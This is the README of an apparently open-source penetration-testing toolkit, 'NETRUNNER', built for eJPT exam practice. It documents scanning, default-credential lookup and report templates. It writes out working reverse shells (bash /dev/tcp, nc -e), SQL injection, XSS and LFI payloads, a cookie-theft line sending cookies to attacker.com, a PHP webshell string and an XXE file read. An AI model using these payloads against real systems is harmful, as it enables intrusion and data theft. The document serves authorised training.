
# NETRUNNER - eJPT Security Assessment Framework

```
╔══════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                      ║
║   ███╗   ██╗███████╗████████╗██████╗ ██╗   ██╗███╗   ██╗███╗   ██╗███████╗██████╗    ║
║   ████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██║   ██║████╗  ██║████╗  ██║██╔════╝██╔══██╗   ║
║   ██╔██╗ ██║█████╗     ██║   ██████╔╝██║   ██║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝   ║
║   ██║╚██╗██║██╔══╝     ██║   ██╔══██╗██║   ██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗   ║
║   ██║ ╚████║███████╗   ██║   ██║  ██║╚██████╔╝██║ ╚████║██║ ╚████║███████╗██║  ██║   ║
║   ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ║
║                                                                                      ║
║           eJPT Security Assessment Framework v2.0                                    ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
```

**A comprehensive, cyberpunk-themed penetration testing automation framework designed specifically for the eLearnSecurity Junior Penetration Tester (eJPT) certification exam.**

---

## Table of Contents
- [Overview](#overview)
- [Features](#features)
- [System Requirements](#system-requirements)
- [Installation](#installation)
- [Quick Install](#quick-install)
- [Manual Installation](#manual-installation)
- [Dependencies](#dependencies)
- [Project Structure](#project-structure)
- [Quick Start Guide](#quick-start-guide)
- [Detailed Usage](#detailed-usage)
- [Network Scanning](#network-scanning)
- [Web Application Testing](#web-application-testing)
- [Payload Generation](#payload-generation)
- [Credential Testing](#credential-testing)
- [Report Generation](#report-generation)
- [Command Reference](#command-reference)
- [Workspace Structure](#workspace-structure)
- [Configuration](#configuration)
- [Best Practices](#best-practices)
- [Exam Workflow](#exam-workflow)
- [Troubleshooting](#troubleshooting)
- [Advanced Features](#advanced-features)
- [Contributing](#contributing)
- [License](#license)
- [Disclaimer](#disclaimer)
- [Credits](#credits)

---

## Overview
**NETRUNNER** is a professional-grade penetration testing automation framework built with Python 3. It streamlines the security assessment process by automating repetitive tasks, generating comprehensive reports, and providing intelligent attack suggestions based on reconnaissance data.

### Key Highlights
- **Automated Reconnaissance**: Fast network scanning with intelligent service detection
- **Attack Vector Suggestion**: AI-powered recommendations based on discovered services
- **Payload Library**: Pre-built exploits for common vulnerabilities (SQLi, XSS, LFI, RCE)
- **Credential Testing**: Automated default credential validation
- **Professional Reporting**: Generate comprehensive security assessment reports
- **Organized Workspace**: Automatic directory structure for evidence management
- **Command Logging**: Complete audit trail of all activities
- **Cyberpunk Theme**: Immersive terminal interface inspired by futuristic aesthetics

### Design Philosophy
NETRUNNER follows the principle of **"Automate the repetitive, enhance the analytical"**. It handles mundane enumeration and payload generation tasks while allowing penetration testers to focus on critical thinking, exploitation strategy, and comprehensive reporting.

---

## Features
### Core Capabilities
#### 1. Network Reconnaissance
- **Quick Scan**: Rapid enumeration of top 1000 ports
- **Full Scan**: Comprehensive all-port scan with version detection
- **Vulnerability Scan**: Targeted vulnerability detection
- **Intelligent Analysis**: Automatic service identification and attack suggestions

#### 2. Web Application Testing
- **Quick Checks**: Automated discovery of common files (robots.txt, .git, .env, backups)
- **Directory Enumeration**: Integration with Gobuster for path discovery
- **Web Server Scanning**: Nikto integration for vulnerability detection
- **Technology Fingerprinting**: Automatic web technology identification

#### 3. Exploit Generation
- **Reverse Shell Payloads**: Multi-platform shells (Bash, Python, PHP, PowerShell, Netcat)
- **SQL Injection**: Pre-built SQLi payloads (auth bypass, UNION, blind)
- **XSS Payloads**: Comprehensive cross-site scripting vectors
- **LFI/RFI**: File inclusion exploit database
- **Command Injection**: OS command injection payloads

#### 4. Credential Management
- **Default Credentials**: Extensive database of default authentication credentials
- **Service-Specific**: Organized by service type (SSH, FTP, MySQL, Web, etc.)
- **Automated Testing**: Batch credential validation (integration ready)

#### 5. Report Generation
- **Professional Templates**: Industry-standard penetration test report format
- **Finding Management**: Structured vulnerability documentation
- **Evidence Tracking**: Screenshot and proof-of-concept organization
- **Credential Storage**: Secure storage of discovered credentials
- **Multiple Formats**: Markdown and JSON export

#### 6. Workspace Management
- **Auto-Organization**: Automatic directory structure creation
- **Evidence Management**: Organized storage for scans, exploits, screenshots, loot
- **Logging System**: Comprehensive activity logging
- **Session Persistence**: Maintains state across multiple engagements

---

## System Requirements
### Supported Operating Systems
- Kali Linux 2023.x or newer (Recommended)
- Parrot Security OS 5.x or newer
- Ubuntu 20.04/22.04 LTS with penetration testing tools
- Debian 11/12 with security tools
- Windows 10/11 with WSL2 (Linux subsystem)
- macOS 12+ with Homebrew

### Software Dependencies
- **Python**: 3.8 or newer (3.10+ recommended)
- **Nmap**: 7.80 or newer
- **Gobuster**: 3.1 or newer (optional but recommended)
- **Nikto**: 2.1.5 or newer (optional)
- **Standard Unix tools**: curl, wget, nc (netcat)

### Hardware Recommendations
- **CPU**: 2+ cores (4+ recommended for faster scanning)
- **RAM**: 2GB minimum (4GB+ recommended)
- **Storage**: 500MB free space minimum
- **Network**: Stable internet connection for tool updates

---

## Installation
### Quick Install
For Kali Linux and similar penetration testing distributions:
```bash
# Clone or download the toolkit
cd ~
git clone https://github.com/ConstantineCTF/netrunner-toolkit.git
# OR manually download and extract
# Navigate to toolkit directory
cd netrunner-toolkit
# Install Python dependencies
pip3 install -r requirements.txt
# Verify installation
python3 ejpt_helper.py --help
```

### Manual Installation
#### Step 1: Download the Toolkit
```bash
# Create working directory
mkdir -p ~/tools
cd ~/tools
# Download toolkit (replace with actual download method)
wget https://example.com/netrunner-toolkit.zip
unzip netrunner-toolkit.zip
cd ejpt_toolkit
```

#### Step 2: Install System Dependencies
**On Kali Linux / Debian / Ubuntu:**
```bash
# Update package list
sudo apt update
# Install required tools
sudo apt install -y nmap gobuster nikto python3 python3-pip
# Optional but recommended
sudo apt install -y curl wget netcat-traditional
```

**On macOS:**
```bash
# Install Homebrew if not already installed
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
# Install dependencies
brew install nmap gobuster python3
```

#### Step 3: Install Python Dependencies
```bash
# Install required Python packages
pip3 install -r requirements.txt
# Alternative: Install manually
pip3 install requests urllib3 colorama pyperclip python-nmap
```

#### Step 4: Verify Installation
```bash
# Test the toolkit
python3 ejpt_helper.py --help
# Expected output: Cyberpunk banner and help menu
```

#### Step 5: Optional - Add to PATH
**Linux/macOS:**
```bash
# Add to .bashrc or .zshrc
echo 'export PATH="$HOME/tools/ejpt_toolkit:$PATH"' >> ~/.bashrc
echo 'alias netrunner="python3 $HOME/tools/ejpt_toolkit/ejpt_helper.py"' >> ~/.bashrc
# Reload shell configuration
source ~/.bashrc
# Now you can run from anywhere
netrunner --help
```

**Windows (PowerShell):**
```powershell
# Add to PowerShell profile
notepad $PROFILE
# Add this line:
function netrunner { python "C:\Path\To\ejpt_toolkit\ejpt_helper.py" $args }
# Reload profile
. $PROFILE
```

### Dependencies
The toolkit requires the following Python packages (automatically installed via requirements.txt):
```
requests>=2.31.0          # HTTP library for web requests
urllib3>=2.0.0            # URL handling and connection pooling
colorama>=0.4.6           # Cross-platform colored terminal output
pyperclip>=1.8.2          # Clipboard functionality (optional)
python-nmap>=0.7.1        # Python interface to Nmap (optional)
```

---

## Project Structure
```
ejpt_toolkit/
│
├── ejpt_helper.py              # Main entry point - CLI interface
├── cleanup_workspaces.sh       # Workspace cleanup utility
├── requirements.txt            # Python dependencies
├── README.md                   # This file
│
├── core/                       # Core functional modules
│   ├── __init__.py            # Module initialization
│   ├── scanner.py             # Network scanning (Nmap automation)
│   ├── web_hunter.py          # Web application testing
│   ├── exploit_gen.py         # Payload generation
│   └── report_gen.py          # Report creation and management
│
├── utils/                      # Utility modules
│   ├── __init__.py            # Module initialization
│   ├── colors.py              # Cyberpunk color schemes and formatting
│   ├── workspace.py           # Workspace and directory management
│   └── logger.py              # Activity logging system
│
├── data/                       # Data files and databases
│   ├── default_creds.json     # Default credentials database
│   └── payloads.json          # Pre-built exploit payloads
│
└── templates/                  # Report templates
    ├── report.md              # Main report template
    └── findings.md            # Individual finding template
```

### Module Descriptions
#### Core Modules
- **scanner.py**: Handles all network reconnaissance activities using Nmap. Provides quick scans, comprehensive scans, and vulnerability-specific scans with intelligent result analysis.
- **web_hunter.py**: Manages web application testing workflows including quick checks for common files, directory enumeration, and web server vulnerability scanning.
- **exploit_gen.py**: Generates various exploit payloads including reverse shells, SQL injection vectors, XSS payloads, and file inclusion attacks.
- **report_gen.py**: Creates professional penetration test reports with support for findings management, evidence tracking, and multiple export formats.

#### Utility Modules
- **colors.py**: Provides cyberpunk-themed color schemes and text formatting functions for terminal output.
- **workspace.py**: Manages workspace creation, directory structure, and file organization for evidence and output management.
- **logger.py**: Implements comprehensive logging for commands, events, and findings with timestamp tracking.

#### Data Files
- **default_creds.json**: Curated database of default credentials for various services (SSH, FTP, databases, web applications, etc.)
- **payloads.json**: Collection of pre-built exploit payloads organized by vulnerability type.

---

## Quick Start Guide
### 1. Basic Network Scan
Perform a quick reconnaissance of a target:
```bash
python3 ejpt_helper.py -t 192.168.1.10 --quick
```

### 2. Comprehensive Network Analysis
Execute a deep scan with service version detection:
```bash
python3 ejpt_helper.py -t 192.168.1.10 --full
```

### 3. Web Application Testing
Check a web application for common vulnerabilities:
```bash
python3 ejpt_helper.py --web http://192.168.1.10
```

### 4. Generate Reverse Shell
Create reverse shell payloads for exploitation:
```bash
python3 ejpt_helper.py --shell 10.10.14.5:4444:all
```

### 5. Get SQL Injection Payloads
Display SQL injection exploit vectors:
```bash
python3 ejpt_helper.py --sqli
```

### 6. Lookup Default Credentials
Query default credentials for a specific service:
```bash
python3 ejpt_helper.py --creds ssh
python3 ejpt_helper.py --creds mysql
python3 ejpt_helper.py --creds web
```

---

## Detailed Usage
### Network Scanning
The network scanning module provides three levels of reconnaissance:

#### Quick Scan
Fast enumeration of the top 1000 most common ports:
```bash
python3 ejpt_helper.py -t <TARGET> --quick
# Examples:
python3 ejpt_helper.py -t 192.168.1.10 --quick
python3 ejpt_helper.py -t 10.10.10.5 --quick
python3 ejpt_helper.py -t target.example.com --quick
```

**Use Cases:**
- Initial rapid reconnaissance
- Quick verification of live hosts
- Time-constrained assessments
- Initial triage of large networks

**Output:**
- Scan results saved to: `workspace/scans/quick_<target>.txt`
- Terminal displays discovered open ports and services

#### Full Scan
Comprehensive scan of all 65535 ports with version detection:
```bash
python3 ejpt_helper.py -t <TARGET> --full
# Examples:
python3 ejpt_helper.py -t 192.168.1.10 --full
python3 ejpt_helper.py -t 10.10.10.0/24 --full  # Scan entire subnet
```

**Features:**
- All port scanning (1-65535)
- Service version detection (-sV)
- Default NSE scripts (-sC)
- OS fingerprinting attempts
- Intelligent attack vector suggestions

**Use Cases:**
- Thorough security assessment
- Finding non-standard service ports
- Complete service enumeration
- Professional penetration tests

**Output:**
- Scan results saved to: `workspace/scans/full_<target>.txt`
- Automatic analysis with suggested attack vectors
- Color-coded priority recommendations

**Attack Suggestions Generated:**
The toolkit analyzes scan results and provides prioritized attack vectors:
- **CRITICAL Priority**: HTTP/HTTPS services, SMB (445), potential EternalBlue targets
- **HIGH Priority**: FTP (21), MySQL (3306), PostgreSQL (5432)
- **MEDIUM Priority**: SSH (22), Telnet (23), SMTP (25)

### Web Application Testing
#### Quick Web Check
Automated discovery of common sensitive files and directories:
```bash
python3 ejpt_helper.py --web <URL>
# Examples:
python3 ejpt_helper.py --web http://192.168.1.10
python3 ejpt_helper.py --web https://target.example.com
python3 ejpt_helper.py --web http://192.168.1.10:8080
```

**Automatically Checks For:**
- `robots.txt` - Search engine directives (may reveal hidden paths)
- `sitemap.xml` - Complete site structure
- `.git/HEAD` - Exposed Git repository
- `.env` - Environment variables (often contains credentials)
- `backup.zip` - Backup archives
- `config.php` - Configuration files
- `phpinfo.php` - PHP configuration disclosure

**Output:**
- Discovered files saved to: `workspace/loot/`
- Terminal displays status of each check
- Findings logged for report generation

#### Directory Enumeration
Brute-force directory and file discovery:
```bash
# Using default wordlist
python3 ejpt_helper.py --web http://192.168.1.10 --dir-enum
# Custom wordlist (modify scanner.py)
# Default uses: /usr/share/wordlists/dirb/common.txt
```

**Features:**
- Gobuster integration
- Tests common extensions: `.php`, `.html`, `.txt`
- Customizable wordlists
- Multi-threaded scanning

**Output:**
- Results saved to: `workspace/scans/gobuster_<hostname>.txt`

#### Web Server Vulnerability Scan
Run Nikto web server scanner:
```bash
python3 ejpt_helper.py --web http://192.168.1.10 --nikto
```

**What Nikto Tests:**
- Server misconfigurations
- Default files and programs
- Insecure files and programs
- Outdated server software
- Version-specific problems

**Output:**
- Results saved to: `workspace/scans/nikto_<hostname>.txt`

### Payload Generation
#### Reverse Shell Generation
Generate reverse shell payloads for various platforms and languages:
```bash
# Generate all shell types
python3 ejpt_helper.py --shell <LHOST>:<LPORT>:all
# Generate specific shell type
python3 ejpt_helper.py --shell <LHOST>:<LPORT>:<TYPE>
# Examples:
python3 ejpt_helper.py --shell 10.10.14.5:4444:all
python3 ejpt_helper.py --shell 10.10.14.5:4444:bash
python3 ejpt_helper.py --shell 192.168.1.100:9001:python
python3 ejpt_helper.py --shell 10.10.14.5:443:powershell
```

**Available Shell Types:**
1. **bash** - Bash reverse shell (Linux/Unix)
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```
2. **python** - Python reverse shell (Linux/Unix/Windows with Python)
```python
python -c 'import socket,subprocess,os;...'
```
3. **nc** - Netcat reverse shell (if nc available)
```bash
nc -e /bin/bash 10.10.14.5 4444
```
4. **php** - PHP reverse shell (web applications)
```php
php -r '$sock=fsockopen("10.10.14.5",4444);...'
```
5. **powershell** - PowerShell reverse shell (Windows)
```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient..."
```

**Output Includes:**
- Raw payload
- URL-encoded version (for web exploitation)
- Listener command: `nc -lvnp <PORT>`
- Saved to: `workspace/exploits/reverse_shells.txt`

**Usage Workflow:**
1. Start listener on your attack machine:
```bash
nc -lvnp 4444
```
2. Execute payload on target (via RCE, file upload, command injection, etc.)
3. Receive reverse shell connection

#### SQL Injection Payloads
Display comprehensive SQL injection exploit vectors:
```bash
python3 ejpt_helper.py --sqli
```

**Payload Categories:**
1. **AUTH BYPASS** - Login form bypass
- `admin' OR '1'='1'--`
- `admin'--`
- `' OR '1'='1'--`
2. **UNION INJECTION** - Data extraction
- `' UNION SELECT NULL--`
- `' UNION SELECT database(),NULL,NULL--`
- `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--`
3. **BOOLEAN BLIND** - True/false-based data extraction
- `' AND '1'='1`
- `' AND SUBSTRING(database(),1,1)='a'--`
4. **TIME-BASED BLIND** - Time delay-based extraction
- `' AND SLEEP(5)--`
- `' AND IF(1=1, SLEEP(5), 0)--`

**Output:**
- Saved to: `workspace/exploits/sqli_payloads.txt`
- Organized by attack type
- Ready for copy-paste testing

#### XSS Payloads
Display cross-site scripting attack vectors:
```bash
python3 ejpt_helper.py --xss
```

**Payload Categories:**
1. **BASIC** - Standard XSS tests
- `<script>alert(1)</script>`
- `<script>alert(document.cookie)</script>`
2. **IMG_TAG** - Image-based XSS
- `<img src=x onerror=alert(1)>`
3. **SVG** - SVG-based XSS
- `<svg onload=alert(1)>`
4. **EVENT_HANDLERS** - Event handler-based
- `<body onload=alert(1)>`
- `<input autofocus onfocus=alert(1)>`
5. **COOKIE_THEFT** - Session hijacking
- `<script>document.location='http://attacker.com/?c='+document.cookie</script>`

#### LFI Payloads
Display local file inclusion attack vectors:
```bash
python3 ejpt_helper.py --lfi
```

**Payload Categories:**
1. **LINUX** - Linux/Unix file paths
- `../../../../etc/passwd`
- `../../../../etc/shadow`
- `../../../../var/log/apache2/access.log`
2. **WINDOWS** - Windows file paths
- `../../../../windows/system32/drivers/etc/hosts`
- `../../../../windows/win.ini`
3. **WRAPPERS** - PHP wrapper exploitation
- `php://filter/convert.base64-encode/resource=config.php`
- `php://input`
- `data://text/plain,<?php system($_GET['cmd']); ?>`

### Credential Testing
Query the default credentials database:
```bash
python3 ejpt_helper.py --creds <SERVICE>
# Examples:
python3 ejpt_helper.py --creds ssh
python3 ejpt_helper.py --creds ftp
python3 ejpt_helper.py --creds mysql
python3 ejpt_helper.py --creds web
python3 ejpt_helper.py --creds tomcat
```

**Available Services:**
- ssh
- ftp
- mysql
- postgres
- mssql
- mongodb
- redis
- tomcat
- web
- jenkins
- grafana
- rabbitmq
- elasticsearch

**Output Format:**
```
[SSH CREDENTIALS]
> root             : root
> root             : toor
> admin            : admin
> administrator    : administrator
```

**Manual Testing:**
Use the displayed credentials to manually test authentication on discovered services.

### Report Generation
Generate a professional penetration test report:
```bash
python3 ejpt_helper.py --report
```

**What Gets Generated:**
1. **Report Template** (`workspace/reports/pentest_report_<timestamp>.md`)
- Executive summary section
- Scope and methodology
- Technical findings placeholders
- Conclusion and recommendations
- Appendices
2. **Findings Template** (`templates/findings.md`)
- Structured format for documenting vulnerabilities

**Report Sections:**
- **Executive Summary**: High-level overview for management
- **Scope**: What was tested and testing timeline
- **Methodology**: Testing approach and frameworks used
- **Technical Findings**: Detailed vulnerability documentation
- **Conclusion**: Overall assessment and prioritized recommendations
- **Appendices**: Tools used, credentials found, references

**Customization:**
Edit the generated report file to add your specific findings, screenshots, and details from the assessment.

---

## Command Reference
### Complete Command Syntax
```bash
python3 ejpt_helper.py [OPTIONS]
```

### Available Options
| Option | Argument | Description |
|--------|----------|-------------|
| `-t`, `--target` | `<IP/HOSTNAME>` | Specify target for scanning |
| `--quick` | None | Execute rapid reconnaissance protocol |
| `--full` | None | Deploy comprehensive scan matrix |
| `--web` | `<URL>` | Analyze web application |
| `--shell` | `<LHOST:LPORT:TYPE>` | Generate reverse shell payload |
| `--sqli` | None | Display SQL injection payloads |
| `--xss` | None | Display XSS payloads |
| `--lfi` | None | Display LFI payloads |
| `--creds` | `<SERVICE>` | Query default credentials database |
| `--report` | None | Generate assessment report template |

### Usage Examples
#### Network Scanning
```bash
# Quick scan of single host
python3 ejpt_helper.py -t 192.168.1.10 --quick
# Full scan of single host
python3 ejpt_helper.py -t 192.168.1.10 --full
# Full scan of subnet (may take significant time)
python3 ejpt_helper.py -t 192.168.1.0/24 --full
# Scan by hostname
python3 ejpt_helper.py -t target.example.com --full
```

#### Web Application Testing
```bash
# Quick web check (HTTP)
python3 ejpt_helper.py --web http://192.168.1.10
# Quick web check (HTTPS)
python3 ejpt_helper.py --web https://target.example.com
# Web check with non-standard port
python3 ejpt_helper.py --web http://192.168.1.10:8080
```

#### Payload Generation
```bash
# All reverse shell types
python3 ejpt_helper.py --shell 10.10.14.5:4444:all
# Specific shell types
python3 ejpt_helper.py --shell 10.10.14.5:4444:bash
python3 ejpt_helper.py --shell 10.10.14.5:4444:python
python3 ejpt_helper.py --shell 10.10.14.5:4444:powershell
# Different listener port
python3 ejpt_helper.py --shell 10.10.14.5:443:bash
python3 ejpt_helper.py --shell 10.10.14.5:9001:nc
# SQL injection payloads
python3 ejpt_helper.py --sqli
# XSS payloads
python3 ejpt_helper.py --xss
# LFI payloads
python3 ejpt_helper.py --lfi
```

#### Credential Lookup
```bash
# SSH credentials
python3 ejpt_helper.py --creds ssh
# FTP credentials
python3 ejpt_helper.py --creds ftp
# Database credentials
python3 ejpt_helper.py --creds mysql
python3 ejpt_helper.py --creds postgres
python3 ejpt_helper.py --creds mssql
# Web application credentials
python3 ejpt_helper.py --creds web
python3 ejpt_helper.py --creds tomcat
python3 ejpt_helper.py --creds jenkins
```

#### Report Generation
```bash
# Generate report template
python3 ejpt_helper.py --report
```

---

## Workspace Structure
Each time you run the toolkit, it creates an organized workspace directory:
```
ejpt_workspace_YYYYMMDD_HHMMSS/
│
├── scans/                      # Network and web scan results
│   ├── quick_192_168_1_10.txt
│   ├── full_192_168_1_10.txt
│   ├── gobuster_target.txt
│   └── nikto_target.txt
│
├── exploits/                   # Generated payloads
│   ├── reverse_shells.txt
│   ├── sqli_payloads.txt
│   └── custom_exploits.txt
│
├── screenshots/                # Evidence screenshots (manual)
│   ├── 20240115_143022_sqli_auth_bypass.png
│   └── 20240115_144533_shell_access.png
│
├── loot/                       # Discovered files and data
│   ├── robots.txt
│   ├── .env
│   ├── credentials.txt
│   └── config.php
│
├── reports/                    # Generated reports
│   ├── pentest_report_20240115_150000.md
│   └── findings_20240115_150000.json
│
└── logs/                       # Activity logs
    ├── commands.log
    ├── events.log
    └── findings.log
```

### Directory Purposes
- **scans/**: All reconnaissance output (Nmap, Gobuster, Nikto)
- **exploits/**: Generated payloads and exploit code
- **screenshots/**: Manual screenshot storage (take screenshots during testing)
- **loot/**: Downloaded files, credentials, sensitive data
- **reports/**: Final deliverables and documentation
- **logs/**: Complete audit trail of activities

### Log File Formats
#### commands.log
```
2024-01-15 14:30:22 - INFO - TARGET: 192.168.1.10 | CMD: nmap -sC -sV -p- --min-rate=1000...
2024-01-15 14:45:18 - INFO - TARGET: http://192.168.1.10 | CMD: gobuster dir -u...
```

#### events.log
```
2024-01-15 14:30:00 - INFO - Workspace initialized
2024-01-15 14:30:22 - INFO - Full scan initiated on 192.168.1.10
2024-01-15 14:45:33 - INFO - Web check completed on http://192.168.1.10
```

#### findings.log
```
2024-01-15 14:35:12 - INFO - CRITICAL on 192.168.1.10: Open SMB port detected
2024-01-15 14:46:05 - INFO - Exposed File on http://192.168.1.10: .env
```

---

## Configuration
### Customizing Default Credentials
Edit `data/default_creds.json` to add your own default credentials:
```json
{
  "service_name": [
    {"username": "admin", "password": "password123"},
    {"username": "root", "password": "toor"}
  ]
}
```

### Customizing Payloads
Edit `data/payloads.json` to add custom exploit payloads:
```json
{
  "custom_category": {
    "payload_type": [
      "payload1",
      "payload2"
    ]
  }
}
```

### Changing Wordlists
Modify the wordlist paths in `core/web_hunter.py`:
```python
def directory_enum(self, url, wordlist='/path/to/your/wordlist.txt'):
```

Common wordlist locations on Kali:
- `/usr/share/wordlists/dirb/common.txt`
- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
- `/usr/share/seclists/Discovery/Web-Content/common.txt`

### Adjusting Scan Speeds
Modify scan parameters in `core/scanner.py`:
```python
# For faster scans (more aggressive)
cmd = f"nmap -T5 -p- --min-rate=5000 -oN {output_file} {target}"
# For stealthier scans (slower)
cmd = f"nmap -T2 -p- --max-rate=100 -oN {output_file} {target}"
```

---

## Best Practices
### Before Starting
1. **Always Get Permission**: Never test systems without explicit written authorization
2. **Read Scope Carefully**: Understand what is in-scope and out-of-scope
3. **Backup Your Work**: Keep multiple copies of workspace directories
4. **Document Everything**: Take screenshots and notes continuously

### During Testing
1. **Start with Reconnaissance**: Spend adequate time on enumeration before exploitation
2. **Test Methodically**: Follow a structured methodology (OWASP, PTES, etc.)
3. **Keep Detailed Notes**: Log all commands, findings, and timestamps
4. **Organize Evidence**: Use the workspace structure to keep files organized
5. **Take Screenshots**: Capture proof of every successful exploit
6. **Stay in Scope**: Double-check you're testing authorized targets only

### After Testing
1. **Generate Reports Promptly**: Document findings while details are fresh
2. **Sanitize Sensitive Data**: Remove or redact unnecessary sensitive information
3. **Verify All Findings**: Ensure all documented vulnerabilities are reproducible
4. **Provide Clear Remediation**: Include specific, actionable fix recommendations
5. **Maintain Evidence**: Keep workspace directories for potential follow-up questions

### Security Considerations
1. **Protect Your Workspace**: Workspace contains sensitive data - encrypt or secure it
2. **Use VPN**: Always use VPN when conducting remote assessments
3. **Avoid Excessive Scanning**: Respect rate limits and avoid DoS-like behavior
4. **Clean Up After**: Remove uploaded web shells, backdoors, created accounts
5. **Report Responsibly**: Follow responsible disclosure practices

---

## Exam Workflow
### Pre-Exam Preparation
```bash
# 1. Test toolkit functionality
python3 ejpt_helper.py --help
python3 ejpt_helper.py --sqli
python3 ejpt_helper.py --shell 127.0.0.1:4444:bash
# 2. Practice on HTB/THM boxes
# Use toolkit on practice targets to build familiarity
# 3. Review cheat sheets
# Keep this README accessible during exam
# 4. Prepare workspace
cd ~/ejpt_exam
mkdir screenshots notes
```

### During eJPT Exam
#### Phase 1: Initial Enumeration (1-2 hours)
```bash
# Scan all targets quickly
python3 ejpt_helper.py -t 192.168.x.10 --quick
python3 ejpt_helper.py -t 192.168.x.11 --quick
python3 ejpt_helper.py -t 192.168.x.12 --quick
# Note: Replace x with actual network from exam
```

#### Phase 2: Deep Reconnaissance (2-3 hours)
```bash
# Full scan on interesting targets
python3 ejpt_helper.py -t 192.168.x.10 --full
# Web application testing
python3 ejpt_helper.py --web http://192.168.x.10
python3 ejpt_helper.py --web http://192.168.x.11:8080
# Review auto-generated attack suggestions
```

#### Phase 3: Exploitation (4-6 hours)
```bash
# Test default credentials on all services
python3 ejpt_helper.py --creds ssh
python3 ejpt_helper.py --creds ftp
python3 ejpt_helper.py --creds mysql
# Generate needed payloads
python3 ejpt_helper.py --shell YOUR_IP:4444:bash
python3 ejpt_helper.py --sqli
# Manual exploitation using generated payloads
# Take screenshots of successful exploits
```

#### Phase 4: Post-Exploitation (2-4 hours)
```bash
# Document findings
# Collect flags
# Take comprehensive screenshots
# Gather evidence
```

#### Phase 5: Reporting (4-8 hours)
```bash
# Generate report template
python3 ejpt_helper.py --report
# Fill in findings, screenshots, and details
# Review logs for commands used
# cat workspace/logs/commands.log
# Proofread and finalize
```

### Time Management
- **Total Exam Time**: 72 hours (3 days)
- **Recommended Work Distribution**:
  - Day 1: Enumeration and initial exploitation (8-10 hours)
  - Day 2: Deep exploitation and post-exploitation (8-10 hours)
  - Day 3: Report writing and review (6-8 hours)
- **Sleep**: Get adequate rest between sessions
- **Breaks**: Take regular breaks to maintain focus

---

## Troubleshooting
### Common Issues
#### Issue: "No module named 'core'" or "No module named 'utils'"
**Cause**: Running script from wrong directory  
**Solution**:
```bash
# Ensure you're in the toolkit root directory
cd /path/to/ejpt_toolkit
python3 ejpt_helper.py --help
```

#### Issue: "ModuleNotFoundError: No module named 'requests'"
**Cause**: Python dependencies not installed  
**Solution**:
```bash
# Install dependencies
pip3 install -r requirements.txt
# Or install manually
pip3 install requests urllib3 colorama
```

#### Issue: Nmap commands fail or timeout
**Cause**: Nmap not installed or target unreachable  
**Solution**:
```bash
# Verify Nmap installation
nmap --version
# Install Nmap if missing
sudo apt install nmap
# Test manually
nmap -sT 192.168.1.10
```

#### Issue: Gobuster not found
**Cause**: Gobuster not installed  
**Solution**:
```bash
# Install Gobuster
sudo apt install gobuster
# Verify installation
gobuster version
```

#### Issue: Scans show no results
**Cause**: Firewall blocking, wrong network, or target down  
**Solution**:
```bash
# Test connectivity
ping 192.168.1.10
# Test manual Nmap
nmap -Pn -p 80,443 192.168.1.10
# Check if you're on correct network/VPN
ip addr show
```

#### Issue: Permission denied errors
**Cause**: Insufficient file permissions  
**Solution**:
```bash
# Make scripts executable
chmod +x ejpt_helper.py
# For Nmap SYN scans, use sudo
sudo python3 ejpt_helper.py -t 192.168.1.10 --full
```

#### Issue: Color codes showing as raw text
**Cause**: Terminal doesn't support ANSI colors  
**Solution**:
```bash
# Install colorama (should fix most issues)
pip3 install colorama
# Use a better terminal (e.g., newer version of Windows Terminal)
# Or use WSL/Linux terminal
```

### Getting Help
If you encounter issues not covered here:
1. Check the logs in `workspace/logs/` for error messages
2. Verify all dependencies are installed: `pip3 list`
3. Test individual components manually (Nmap, Gobuster, etc.)
4. Review Python version: `python3 --version` (should be 3.8+)

---

## Advanced Features
### Extending the Toolkit
The modular architecture allows easy extension:

#### Adding New Payload Types
Edit `data/payloads.json`:
```json
{
  "xxe": {
    "basic": [
      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
    ]
  }
}
```
Then add display logic in `ejpt_helper.py`.

#### Adding New Services to Credential Database
Edit `data/default_creds.json`:
```json
{
  "rdp": [
    {"username": "Administrator", "password": "password"},
    {"username": "admin", "password": "admin"}
  ]
}
```

#### Creating Custom Scan Profiles
Add to `core/scanner.py`:
```python
def stealth_scan(self, target):
    """Stealthy slow scan"""
    cmd = f"nmap -sS -T2 -f -p- --max-rate=100 -oN {output_file} {target}"
    return self._run_nmap(cmd)
```

### Integration with Other Tools
#### Metasploit Integration
```bash
# Export Nmap results to Metasploit format
nmap -sV -oX scan.xml 192.168.1.10
# Import in Metasploit
msfconsole
db_import scan.xml
```

#### Using with Burp Suite
1. Intercept web traffic in Burp
2. Use generated payloads in Burp Repeater/Intruder
3. Copy findings to toolkit workspace for documentation

#### Combining with SQLMap
```bash
# Use toolkit to identify SQLi points
python3 ejpt_helper.py --sqli
# Then use SQLMap for exploitation
sqlmap -u "http://target.com/page.php?id=1" --batch --dbs
```

---

## Contributing
### How to Contribute
Contributions are welcome! To contribute:
1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

### Contribution Guidelines
- Follow PEP 8 Python style guidelines
- Add docstrings to all functions
- Test new features thoroughly
- Update README if adding new functionality
- Maintain the cyberpunk theme for UI elements

### Areas for Contribution
- Additional payload types (XXE, SSRF, etc.)
- More default credentials
- Integration with additional tools
- Performance optimizations
- Cross-platform compatibility improvements
- Additional report formats (PDF, HTML)

---

## License
This project is licensed under the MIT License.

```
MIT License
Copyright (c) 2024 NETRUNNER Development Team
Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
